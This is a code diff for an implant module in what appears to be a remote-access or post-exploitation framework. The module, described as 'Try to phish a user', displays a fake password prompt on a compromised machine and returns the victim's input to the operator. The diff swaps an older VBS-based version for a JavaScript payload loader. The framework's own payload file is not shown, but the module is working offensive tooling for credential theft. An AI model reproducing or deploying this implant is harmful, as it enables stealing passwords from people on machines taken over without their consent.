@@ -1,25 +1,25 @@
-from core.job import Job
+import core.job
+import core.implant
+import uuid
 
-AUTHORS = ['RiskSense, Inc.']
+class PasswordBoxJob(core.job.Job):
+    def done(self):
+        self.display()
 
-OPTIONS = {
-    'MESSAGE': [True, 'You must enter your password to continue...', 'password phishing text'],
-    'TITLE': [True, 'Windows Authentication', 'password phishing text']
-}
+    def display(self):
+        self.shell.print_plain("Input contents:")
+        self.shell.print_plain(self.data)
 
-def on_postwork_callback(job):
-    self.shell.print_good("Password was: ", job.data)
+class PasswordBoxImplant(core.implant.Implant):
 
+    NAME = "Password Box"
+    DESCRIPTION = "Try to phish a user"
+    AUTHORS = ["zerosum0x0"]
 
-class PasswordJob(Job):
-    def on_view(self):
-        pass
+    def load(self):
+        self.options.register("Message", "You must enter your password to continue...", "Displayed to user")
 
-def run(shell):
-    with open("data/vbs/implant_phish_password_box.vbs", "rb") as f:
-        script = f.read()
-
-    script = script.replace(b"~MESSAGE~", shell.get_option("MESSAGE").encode())
-
-    shell.create_job(script, PasswordJob)
-    #shell.create_job(data, on_postwork_callback)
+    def run(self):
+        payloads = {}
+        payloads["js"] = self.loader.load_script("data/implant/phish/password_box.js", self.options)
+        self.dispatch(payloads, PasswordBoxJob)
